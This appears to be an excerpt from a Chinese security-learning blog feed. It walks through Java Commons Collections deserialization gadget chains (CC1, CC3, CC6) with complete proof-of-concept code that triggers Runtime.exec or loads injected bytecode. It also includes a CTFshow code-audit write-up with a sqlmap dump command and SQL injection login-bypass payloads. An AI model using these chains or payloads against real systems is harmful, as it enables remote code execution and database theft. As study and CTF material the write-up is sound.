class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">           <span class="type">Constructor</span> <span class="variable">constructor</span>  <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">           constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">           <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br><span class="line">           <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,h);</span><br><span class="line">           <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Override.class,map);</span><br><span class="line">           <span class="comment">//serialize(o);</span></span><br><span class="line">           unserialize(<span class="string">&quot;a.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">       &#123;</span><br><span class="line">              <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;a.bin&quot;</span>));</span><br><span class="line">              oos.writeObject(obj);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">       &#123;</span><br><span class="line">              <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">              <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">              <span class="keyword">return</span> obj;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面的是利用<strong>InvokerTransformer</strong>类</p><h3 id="InstantiateTransformer和TrAXFilter类"><a href="#InstantiateTransformer和TrAXFilter类" class="headerlink" title="InstantiateTransformer和TrAXFilter类"></a><strong>InstantiateTransformer</strong>和<strong>TrAXFilter</strong>类</h3><p>这个链子是在<code>InvokerTransformer</code>这个被禁的时候来替代的类</p><p><code>InvokerTransformer</code>这个被禁了之后就调用不了<code>newTransformer</code>方法了，所以我们得去找一下还有谁能掉用<code>newTransformer</code>方法</p><p><img src="../images/image-20230521185623140.png" alt="image-20230521185623140"></p><p>然后找到了这个类来调用了<code>newTransformer</code>方法  但是这个不能进行反序列化，因为没有继承于serialize</p><p>所以我们就得像使用<code>Runtime</code>类一样用这个类了</p><p>这里话发现这条链子的作者就发现了<strong>InstantiateTransformer</strong>类可以满足条件</p><p><img src="../images/image-20230521190132739.png" alt="image-20230521190132739"></p><p>给<code>TrAXFilter</code>实例化的时候就会调用到他里边的构造方法</p><p><img src="../images/image-20230521190235921.png" alt="image-20230521190235921"></p><p>然后就调用到<code>newTransformer</code>方法了</p><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;translet&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;C://Users//25302//Desktop//program//Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"><span class="comment">//        Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);</span></span><br><span class="line"><span class="comment">//        tfactoryField.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        tfactoryField.set(templates, new TransformerFactoryImpl());</span></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap =<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decoratetransfored</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        <span class="comment">//得到Annotationtransform对象</span></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">o</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Target.class, decoratetransfored);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, o);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> declaredConstructor.newInstance(Override.class, map);</span><br><span class="line">        serialize(o1);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ObjectOutputStream objectOutputStream=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;ser.bin&quot;</span>)));</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(Filename)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230521190547007.png" alt="image-20230521190547007"></p><p>只是修改了这部分，就是用<strong>InstantiateTransformer</strong>和<strong>TrAXFilter</strong>类替代了<strong>InvokerTransformer</strong></p><p>然后其他步骤就和上面一样了</p><p><img src="../images/image-20230520003536842.png" alt="image-20230520003536842"></p><p><strong>只是修改了执行代码的部分</strong>，前面的可以通过<code>cc1</code>或者<code>cc6</code>来进行拼接</p><p>最上面的是<code>cc1</code></p><p>最下面的是<code>cc6</code>  ——&gt;  就是把<code>AnnotationInvocationHandler</code>被禁掉的，然后</p><p>用<code>HashMap</code>来替代的一种方法</p>]]></content>
      
      
      
        <tags>
            
            <tag> java反序列化 cc3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化-cc6</title>
      <link href="/posts/d6e4b178.html"/>
      <url>/posts/d6e4b178.html</url>
      
        <content type="html"><![CDATA[<p>由于jdk1.8_71以后对<code>AnnotationInvocationHandler</code>这个类进行了处理，然后就导致了cc1链用不了了，然后就诞生了个cc6的链子</p><p>就是修改了这个类里边的readObject方法</p><p><img src="../images/image-20230319193748245.png" alt="image-20230319193748245"></p><p>这就是链子的构造</p><p>不受jdk版本的影响，这里的话就直接跟着图片上的链子来走了</p><p>这里简单说一下就是这里的话是先HashMap里面的readObject方法，然后到调用到里面的hash方法，然后hash方法就会调用到hashcode方法，然后就接着下面写的就行</p><p>就是找到了这个类(TiedMapEntry)</p><p><img src="../images/image-20230319194451418.png" alt="image-20230319194451418"></p><p>然后找到这个类里边的hashcode方法，这个方法里面调用了getValue</p><p><img src="../images/image-20230319194615690.png" alt="image-20230319194615690"></p><p><img src="../images/image-20230319194625684.png" alt="image-20230319194625684"></p><p>然后getValue里面就会调用到get方法，然后map可控，可以传为Lazymap，然后后面的就和cc1一样了</p><p><img src="../images/image-20230319195615382.png" alt="image-20230319195615382"></p><p>这里就先把之前写的cc1的东西给复制过来</p><p><img src="../images/image-20230319200144657.png" alt="image-20230319200144657"></p><p>这里就先进行补充，这里利用put给hashmap里面赋值(hashmap构造函数不能赋值)，这里在序列化的时候会调用hashmap里的readObject方法，然后调用里面的hash方法，hash方法里面就会调用tiedMapEntry的hashcode方法，然后这个就会TiedMapEntry里面的getValue方法，然后在调用lazy.get方法，然后其他的就和cc1一样了</p><p>但是想法总是好的，这里有一个问题就是我们在put传值的时候，也调用了hash方法，导致在序列化的时候就弹了计算器(和URLDNS那条链类似)</p><p><strong>解决办法</strong></p><p><img src="../images/image-20230319201415245.png" alt="image-20230319201415245"></p><p>按照代码的顺序一行一行看下来，就是在put传参的时候把lazymap里面的值给修改掉，改成一个没啥用的值，然后让他不能执行，(简单点说就是把链子破坏)，然后下面再用反射给修改回来</p><p>但是这里还不行，这里还是和URLDNS那条链一个样子，就是会新建一个key的值，导致后面反序列化的时候进不来这个if，然后导致调用不到这个put</p><p>这个key是Lazymap类里边的</p><p><img src="../images/image-20230319202113261.png" alt="image-20230319202113261"></p><p><strong>解决办法</strong></p><p>就是把这个key给删了</p><p><img src="../images/image-20230319202354112.png" alt="image-20230319202354112"></p><p><strong>cc6.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.xml.internal.ws.policy.privateutil.PolicyUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span> &#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">                &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(hashMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap1.put(tiedMapEntry,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(lazyMap,chainedTransformer);</span><br><span class="line">        <span class="comment">//serialize(hashMap1);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的话要把debug时候的自动调用tostring方法给关掉，不然可能会不成功</p><p><strong>这里话是不限制jdk版本的，只对cc链的版本进行限制</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> java反序列化 cc6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-代码审计</title>
      <link href="/posts/29301d9.html"/>
      <url>/posts/29301d9.html</url>
      
        <content type="html"><![CDATA[<h2 id="web301"><a href="#web301" class="headerlink" title="web301"></a>web301</h2><p>题目(给了源码)</p><p><strong>checklogin.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>];</span><br><span class="line"><span class="variable">$userpwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select sds_password from sds_user where sds_username=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; order by id limit 1;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span>=<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_BOTH);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows&lt;<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strcasecmp</span>(<span class="variable">$userpwd</span>,<span class="variable">$row</span>[<span class="string">&#x27;sds_password&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>; </span><br><span class="line"><span class="variable">$result</span>-&gt;<span class="title function_ invoke__">free</span>();</span><br><span class="line"><span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>fun.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_decode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;sds&quot;</span>))).<span class="string">&quot;sds&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>给的代码里主要的就是这两个代码了，那么我们就可以对这个代码进行审计一下</p><p>我们进行审计发现这个代码sql是没有waf的，那么我们就可以尝试去进行一下<strong>sqlmap</strong>工具的利用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>f06618b6<span class="number">-6697</span><span class="number">-4</span>bc5<span class="operator">-</span>a506<span class="number">-50</span>b8e9ce7739.challenge.ctf.show<span class="operator">/</span>checklogin.php <span class="comment">--form --batch --dump</span></span><br></pre></td></tr></table></figure><p>yu师傅使用的这个工具就会全部导出数据库  表  列  和列里面的东西</p><p><img src="../images/image-20230318221422214.png" alt="image-20230318221422214"></p><p>最后就会拿到账号密码了</p><p><img src="../images/image-20230318221525179.png" alt="image-20230318221525179"></p><p>拿到flag了</p><p>这里的话代码中又有一个逻辑漏洞</p><p><img src="../images/image-20230318221733657.png" alt="image-20230318221733657"></p><p>这里就是只要我们输入的密码和数据库中的密码相等就行了</p><p>他这里是利用sql语句来查找数据库中的密码，这里我们就可以进行控制数据库中的密码</p><p><img src="../images/image-20230318223043391.png" alt="image-20230318223043391"></p><p>当前面查询不存在时，就会使用后面定义的值</p><p><strong>paylaod</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1#</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h2 id="web302"><a href="#web302" class="headerlink" title="web302"></a>web302</h2><p>题目</p><p>给了给题目说明</p><p><strong>修改的地方</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strcasecmp</span>(<span class="title function_ invoke__">sds_decode</span>(<span class="variable">$userpwd</span>),<span class="variable">$row</span>[<span class="string">&#x27;sds_password&#x27;</span>]))</span><br></pre></td></tr></table></figure><p>这里修改了这，那么就会对我们传进来的userpwd进行加密</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_decode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;sds&quot;</span>))).<span class="string">&quot;sds&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为我们传进来的str是1，所以就可以利用这个写好的php代码来进行生成加密后的值</p><p><img src="../images/image-20230318225948652.png" alt="image-20230318225948652"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select &quot;d9c77c4e454869d5d8da3b4be79694d3&quot;#</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>然后在重新修改一下sql语句</p><p>然后这道题就完成，这只是简单的对用户传进来的密码进行加密而已，然后又给了加密代码，所以这样就能通过给的加密代码判断出加密的值了</p><h2 id="web303"><a href="#web303" class="headerlink" title="web303"></a>web303</h2><p>题目</p><p>这次换源码了</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化-cc1</title>
      <link href="/posts/488024db.html"/>
      <url>/posts/488024db.html</url>
      
        <content type="html"><![CDATA[<p>我是看这个视频来进行学习的 <a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&amp;vd_source=bacfffe46b930fda5761b63367eb298c">cc1</a></p><p>这里的话不要跳过视频里的那个安装调试包的代码，跳过的话就会复现不了，得一步一步跟着做</p><p>这个cc1链的危险方法就是发现了Transformer接口</p><p><img src="../images/image-20230316222922808.png" alt="image-20230316222922808"></p><p>然后利用里面的这个transform函数</p><p><img src="../images/image-20230316223143480.png" alt="image-20230316223143480"></p><p>这里话就是本篇文章主要讲的地方，就是利用这个函数，来进行操作</p><p>这里面还写一个反射调用，并且里面的值还可控，这就是造成任意方法调用了，所以这就是这个链子的入口</p><p>这里的话，我们可以尝试利用这个函数来弹个计算器</p><p><img src="../images/image-20230316225007753.png" alt="image-20230316225007753"></p><p>这里是<code>InvokerTransformer</code>的构造函数方法，结合上面的图片，可知通过这个构造函数传参从而弹个计算器</p><p><img src="../images/image-20230317164525497.png" alt="image-20230317164525497"></p><p>这就成功弹出了一个计算器</p><p><strong>发现这里可以任意函数调用后，那么我们就得去找谁的里面调用transformer</strong></p><p><img src="../images/image-20230317165005890.png" alt="image-20230317165005890"></p><p>查找后发现有21个调用，那么我们就得从里面找到一个合适的方法</p><p>(得找一个不同名的函数里面时调用transformer的)</p><p>然后我们就找到了这个方法是调用transformer的(是在TransformedMap类里边的)</p><p><img 